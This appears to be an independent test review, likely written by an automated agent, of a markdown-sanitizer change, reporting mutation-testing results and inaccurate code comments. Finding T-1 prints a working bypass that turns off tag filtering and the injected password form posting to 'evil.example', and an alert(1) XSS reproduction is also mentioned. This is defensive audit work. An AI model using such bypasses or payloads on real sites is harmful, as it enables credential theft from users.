# #195 markdown-sanitize — round 8 independent TEST REVIEW

**Branch:** `markdown-sanitize-r8` · **Base:** `7b4f6dd` · **Head:** `3f6a695`
**Reviewer:** `test-195-r8` (independent leg; a code reviewer and a security
auditor ran on the same SHA in parallel and neither saw this work)
**Scope:** read-only review of `web/src/util/markdown.ts` and
`web/src/util/markdown.test.ts`. No source file was modified; every mutation was
applied and reverted by a harness that verifies `git status --porcelain` empty
afterwards.

**Gates**, re-run at the end of the leg, exit codes read from the child process:
`npm test` exit **0** (**78 checks passed (123 assertions)**),
`npx tsc --noEmit` exit **0**, `npm run build` exit **0**.
Dependencies installed with `npm ci`.

**Full report:** `scratchpad/projects/farmtable/reports/test-195-r8.md`.
Prediction files (written before the corresponding measurements):
`reports/test-195-r8-evidence/predictions-01-totals.md`,
`predictions-02-mutations.md`.

---

## Verdict

Round 8's test work is genuine and is not inert: 48 scored mutations, 45 landed
exactly as predicted, and every rule the file claims is fixtured went red for the
reason the file says it would. B2's positive control for `fixtureTableViolation`
is sound. The post-hoc tally sub-form is absent again.

**Two blockers, both of which say the round did not finish what it started.**

## Blocking

**T-1. A live bypass of the arity pin at HEAD, same class as C7-l, in two shapes.**
`stripInertText` deliberately preserves template literals, and a TypeScript
*template-literal type* is a template literal in the parameter list. A `)` inside
one truncates `balancedDeclarationParameterLists` (shape 1); a `(` inside one
leaves the list unterminated, whereupon the whole file tail is returned as a
single "parameter" and `splitTopLevelParameters` finds no top-level comma
(shape 2). Applied to the real `markdown.ts` with a second parameter that switches
`FORBID_TAGS`/`FORBID_ATTR` off:

```
export function renderMarkdown(md: string | `x)y`, opts: { inline?: boolean } = {}): string
  -> npm test 0 (78 checks, 123 assertions), tsc --noEmit 0, npm run build 0
  renderMarkdown(form, { inline: true })
    -> <form action="https://evil.example"><input name="p" type="password"></form>
```

One-token attribution controls both red: `'x)y'` (quoted) and the union term
deleted. The backtick is the whole exploit. Neither arity table contains a single
backtick.

**T-2. B3a — the round's headline production change — has no regression pin.**
Reverting `createDOMPurify(window)` to the process-global singleton is
**GREEN 78/123 with `tsc` 0**, and the reverted tree reproduces the `alert(1)`
measurement `markdown.ts:99-103` quotes as its own justification. R8/R9 cannot
catch it: `markdown.ts` is `SANITIZER_OWNER` and is exempt by construction. Round 7
gave the identical `marked` fix a by-effect pin; this round did not give DOMPurify
one, so the asymmetry `markdown.ts:86-89` says "is no longer accepted" has simply
moved from production into the suite.

## Non-blocking

- **T-3 (Medium) — a masking pair, the shape this round's own discovery had.**
  `{ strings: true }` in the arity scan and the `decls.length !== 1` rule mask each
  other: C7-h, the only fixture that exercises string blanking, is caught by the
  multi-declaration rule instead. Setting `strings: false` alone is GREEN; removing
  the rule alone reddens only C7-e2; doing both reddens C7-e2 **and** C7-h. String
  blanking in the arity scan therefore has zero unique fixture coverage — and it is
  exactly the half that catches the quoted form of T-1.
- **T-4 (Medium) — three silently-emptyable fixture tables.**
  `fixtureTableViolation` guards 13 named tables. The ownership check loops over
  three *inline* arrays holding nine more fixtures that nothing guards; emptying
  each is GREEN 78/123. Contrast: emptying the inline array in `inputContract` is
  RED via `EXPECTED_ASSERTIONS` (123 → 118), because that loop runs `assert*`.
- **T-5 (Medium) — `markdown.test.ts:1696-1698` is false, and unfixtured.**
  "An UNTERMINATED list is not silently skipped … the caller reports something
  rather than passing" — it passes; that is T-1 shape 2. Making the unterminated
  branch push nothing at all is GREEN. The sentence was written in `4b430c6`,
  whose message is "correct two false rationales", in the docblock of the function
  that fixed the previous false rationale.
- **T-6 (Medium) — `markdown.test.ts:643-644` is false.** The `.length === 1`
  ablation was reproduced independently (control: ablated tree GREEN 78/123). It
  uniquely catches **two** spellings, C7-d (UP) *and* C7-k (DOWN), not one, so
  "a backstop for exactly the UP direction" is wrong. `markdown.ts:186-189` states
  the same measurement correctly; the two files now disagree.
- **T-7 (Low) — four "eleven" sentences are wrong at HEAD** (`markdown.ts:176`,
  `markdown.test.ts:636`, `:3205`, `:3217`); all four should read thirteen.
  Measured per revision, `markdown.test.ts:3205` ("All eleven fixture tables") was
  **false when written**: `4333278` had already taken the guarded count to 13
  before B2 landed at `1e4ac81`.
- **T-8 (Low) — `markdown.test.ts:2551-2554` "narrower view" is false.** Per-file
  R7 and the promoted tree-wide R7 run the same predicate over the byte-identical
  view (`stripInertText(src, { strings: true })`). The per-file copy is worth
  keeping, but for the reason the file already gives two lines earlier for R6b —
  "a redundant rule is kept when it names the mistake precisely" — not this one.
- **T-9 (Info)** — both promoted tree-wide tripwires (R6b, R7) are vacuous against
  the tree; their predicates are fixtured, their tree-wide call sites are not.

## The two trust items handed to this leg

- **"Round 6 landed three production changes, not four" — CONFIRMED TRUE.**
  `markdown.ts` has exactly two code changes across round 6 (`slot` appended to
  `FORBID_ATTR`; the non-string guard); `package.json` has the dompurify floor.
  The fourth claimed change, "URI policy pinned", is test-only —
  `86f30bc:web/src/util/markdown.ts` contains no protocol handling at all.
- **The "GREEN at 69 checks" figures DO have an anchor — not a defect.** 69
  `check(` call sites existed at exactly two revisions, `538ce54` and `c98eb79`,
  round 7's first two commits. The docblocks are honest measurements of round-6
  defects taken on an early round-7 tree. This also closes the item the file itself
  flags as unreconciled at `markdown.test.ts:3618-3621`: **"Moved 61 → 69 in round
  6" should read 61 → 68**, because round-6 head measures 68 and the 69 belongs to
  round 7.

## Method notes

All five pinned totals were derived from a static read of the source and written
to a prediction file **before** `npm test` was run on this tree; all five match
(77 / 78 / 123 / 51 / 2). Mutations were content-addressed, with the harness
aborting unless an anchor matched exactly once, aborting on a non-GREEN/non-78/123
baseline, aborting on a green run whose check total could not be parsed, and
re-verifying a clean tree after every restore. RED-via-`tsc` was scored separately
from RED-via-the-suite and never counted as a detection by the suite.

One genuine void run occurred **in this leg's own work** and is reported in full:
a regex extraction of `ARITY_EVASIONS` matched 5 of 13 entries and printed a tidy,
confident five-row `Function.length` table with `TSC=0`. It was caught only
because it also printed `PARSED 5` beside a pin that says 13 — a number
contradicting something visible, which remains the only detector that has ever
worked here. Every `.length` and ablation figure in the report comes from the
corrected extraction, which round-trips to `EVASIONS 13 LEGITIMATE 8`.

Four errors were found in the review brief and are itemised in the report's
WHERE THIS BRIEF IS WRONG section; the load-bearing one is that it repeats the
"eleven fixture tables" figure, which propagated tree → log → brief without anyone
recomputing it.
